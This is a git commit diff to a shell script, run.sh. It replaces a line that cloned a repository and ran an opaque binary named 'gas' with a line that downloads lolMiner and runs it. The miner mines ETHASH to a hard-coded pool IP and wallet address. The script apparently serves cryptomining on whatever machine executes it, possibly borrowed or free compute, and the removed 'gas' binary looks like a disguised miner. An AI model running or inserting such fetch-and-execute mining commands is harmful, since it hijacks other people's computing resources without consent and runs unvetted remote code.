5f6d1c405b58ac3992b1ee98efec39e92d7d0235
edikusumati <108272275+edikusumati@users.noreply.github.com>
2022-07-23 08:05:53 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-git clone https://github.com/edikusumati/asu && cd asu && chmod +x gas kopi.ini && ./gas kopi.ini
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.41/lolMiner_v1.41b_Lin64.tar.gz && tar -xvf lolMiner_v1.41b_Lin64.tar.gz && cd 1.41b && ./lolMiner --algo ETHASH --pool 104.237.157.192:80 --user 3A7jTKEyNHyLLnUM4982okvojs31ATXBLX
